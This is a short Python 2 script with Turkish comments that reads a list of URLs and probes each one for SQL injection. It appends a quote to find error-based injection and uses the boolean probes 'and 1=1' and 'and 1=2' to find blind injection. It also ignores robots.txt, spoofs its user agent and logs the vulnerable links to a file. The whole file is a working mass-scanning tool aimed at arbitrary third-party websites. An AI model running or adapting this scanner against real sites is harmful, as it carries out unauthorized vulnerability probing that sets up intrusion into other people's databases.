
#! -*- coding: utf-8 -*-
import mechanize,re,sys #kullanacağımız modülleri aktardık.
br = mechanize.Browser() # tarayicimizi olusturduk..
br.set_handle_robots(False) # robots.txt engellerini aşmak için false dedik
br.addheaders = [('User-agent', 'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Kubuntu)')] # header ekledik
mechanize._sockettimeout._GLOBAL_DEFAULT_TIMEOUT = 5 # timeout süresini belirledik
 
def yardim(): #yardim fonksiyonumuz
	print "[!] Örnek kullanım:\n>> sql-i.py -i linkler.txt -o sonuclar.txt" # örnek kullanım..
	print "\n[+] = sql injection var demek!\n[?] = sql injection olabilir demek!\n[??] = blind sql injection olabilir demek!"
def Adim2(link): # Adım 2
	#print "Adım 2 ye geçildi !!"
	istek3 = br.open(link+"+and+1=1") # linkimiz 3. istekde mantıksal sorgu ile tekrar açıldı
	kaynak_kod3 = istek3.read() # açılan sitenin kaynak kodu alındı
	istek4 = br.open(link+"+and+1=2") # 4. istekte yine ilk mantıksal sorguya ters bir mantık ile tekrar açıldı
	kaynak_kod4 = istek4.read() # açılan sitenin kaynak kodu alındı
	if kaynak_kod3 != kaynak_kod4: # kaynak kodlar karşılaştırıldı aynı değil ise !
		print "[??] "+link # Blind sql injection olabilir dendi..
		dosya2.write(link+"\n") # ve dosyamıza yazıldı
		pass # geç
	else: # kaynak kodlar aynı ise
		pass # geç
def Adim1(link): #Adım 1
	istek = br.open(link) # gelen linke istek gönderilir..
	kaynak_kod = istek.read() # açılan linkin  kaynak kodu alınır
	istek2 = br.open(link+"'a") # aynı linke 'a eklenerek 2. istek atılır 
	kaynak_kod2 = istek2.read() # açılan sitenin kaynak kodu 2. kez alınır
	if kaynak_kod != kaynak_kod2: # alınan 2 kaynak kod eşit değil ise 
		if re.findall('You have an error in your SQL',kaynak_kod2): # 2. aldığımız kaynak kodda şu cümle aranır
			print "[+] "+link # varsa ekrana yazdır
			dosya2.write(link+"\n") # ve dosyamıza yazdırırız
			pass # geç
		else: # 2.kaynak kod da sihirli sözcük yok ise
			print "[?] "+link # Sql injection olabilir denilir..
			dosya2.write(link+"\n") # ve dosyamıza yazdırırız
			pass # geç
	else: # eğer karşılaştırılan 2 kaynak kod da aynı ise
		Adim2(link) # Adım 2 ye gider linkimiz..
 
try: # Hatalar için try kullanıyoruz
	if sys.argv[1] == "-i" and sys.argv[3] == "-o": # argümanlarda -i ve -o var mı kontrol ettik eğer var ise
		i_dosya = sys.argv[2] # argümanlarımızı alıyoruz
		o_dosya = sys.argv[4] # argümanlarımızı alıyoruz
		dosya = open(i_dosya,"r") # dosyamızı okumak adına açtık
		kelimeler = dosya.read() # okuduk
		linkler = kelimeler.split("\n") # listemize aktardık split ile parçalayarak..
		dosya2 = open(o_dosya,"a") # 2. dosyamızı açtık üzerine eklemeli olarak yazmak için !		
		for a in linkler: # linklerimizi for döngüsünde döküyoruz
			try: # yine aynı şekil sitelerin güvenlik duvarlarının verdikleri cevaplardan programımızın hata vermemesi için try kullandık
				Adim1(a) # Adim 1 e linkimizi yolladık
			except:
				pass # Hata çıkarsa geç sıradaki linke 
		print "[+] İslem bitmistir.." # işlem bittiğinde
	else: # argümanlar yok ise
		yardim() # yardim fonksiyonunu göster kullanma kılavuzu
except: # Hata çıkarsa
	yardim() # yardim
